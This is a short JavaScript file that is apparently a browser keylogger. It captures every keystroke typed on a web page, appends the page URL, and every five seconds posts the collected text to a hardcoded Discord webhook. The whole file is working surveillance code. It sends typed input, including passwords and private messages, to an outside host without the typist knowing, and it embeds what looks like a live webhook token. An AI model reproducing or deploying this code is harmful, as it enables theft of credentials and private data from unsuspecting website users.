var discord_webhook = "https://discord.com/api/webhooks/806072777970417674/-2idlXPKskXKg88MhUTXaixtQTnr_-hng6NsLP7phZqCFAHX04kIZICZ9ZAxli0Zz2l2";
// defines Discord webhook used

var text = "";
var messageInterval = 5000;
var botName = Math.random().toString()


function sendMessage() {  // sends message using Discord webhook
    var request = new XMLHttpRequest();

    request.open("POST", discord_webhook);
    request.setRequestHeader('Content-type', 'application/json');

    if (text != "") {
        text += " <<<URL: " + window.location.href + " >>>"

        var params = {
            username: botName,
            avatar_url: "",
            content: text
        }

        request.send(JSON.stringify(params));
        text = "";
    }
}


document.addEventListener('keydown', function(event) {  // adds keys to text as they are typed
    text += event.key;
});


setInterval(function(){ // sends text data to the discord every defined interval
    sendMessage();
}, messageInterval);